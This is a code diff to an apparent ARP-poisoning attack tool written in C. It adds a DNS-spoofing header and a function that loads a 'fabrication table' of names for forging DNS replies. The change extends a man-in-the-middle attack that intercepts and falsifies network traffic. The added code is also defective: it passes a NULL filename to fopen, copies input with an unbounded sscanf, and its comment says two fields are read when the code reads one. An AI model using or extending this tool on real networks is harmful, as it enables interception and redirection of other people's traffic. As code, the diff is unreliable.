@@ -44,6 +44,8 @@ payload         @(X + SIZE_ETHERNET + (IP header length) + (TCP header length))
 #include <netinet/in.h>
 #include <sys/time.h>
 
+#include "dns_spoof.h"
+
 #ifndef ETHER_HDRLEN
 #define ETHER_HDRLEN 14
 #endif
@@ -848,6 +850,9 @@ int main(int argc, char* argv[]) {
 
     pthread_t poison_arp_t;
 
+    char *ft_filename     = NULL;
+    fill_table(ft_filename);
+
     attack.handle = pcap_open_live(if_name, BUFSIZ, 1, -1, pcap_errbuf);
     pthread_create(&poison_arp_t, NULL, (void*)poison_arp, &attack);
     // pthread_create(&poison_gateway_t, NULL, (void*)process_packet_queue, NULL);
@@ -898,4 +903,67 @@ poison_arp(void *data) {
     
     pthread_exit("Arp Poison Stopped.\n");
     return 0;
+}
+
+void fill_table (char *ft_filename) {
+    FILE *ft;                       /* fstream pointer                */
+    int i,                          /* loop counter                   */
+        ftable_size;                /* num lines in fabrication table */
+    char line[128];                 /* current line being processed   */
+
+    /*
+     *  open the file
+     */
+
+    ft = fopen(ft_filename, "r+");
+
+    if (!ft)    {
+        printf("fill_table failed");
+        exit (1);
+    }
+
+    /*
+     * determine the size of the fabrication table.
+     * ignore comments and blank lines.
+     */
+    for (ftable_size = 0; fgets(line, 128, ft) != NULL; ftable_size++) {
+        if ((line[0] == '#') || (line[0] == '\n')) {
+            ftable_size--;
+        }
+    }
+
+    /*
+     * allocate memory for the fabrication table
+     */
+    ftable = (struct ft_entry *)malloc(sizeof(struct ft_entry) * ftable_size);
+
+    /*
+     *  rewind and step through the the file line by line
+     *  read the first 2 entries from each line, the rest are comments
+     */
+
+    rewind(ft);
+
+    for (i = 0; i < ftable_size; i++)    {
+        if (fgets(line, 128, ft) == NULL)
+            break;
+
+        if ((line[0] == '#') || (line[0] == '\n'))  {
+            i--;
+            continue;
+        }
+
+        sscanf(line, "%s", ftable[i].name);
+    }
+
+    /*
+     *  make a record of how many entries we've read
+     */
+
+    num_entries = i;
+
+    /*
+     *  we're done with the file, close it
+     */
+    fclose(ft);
 }
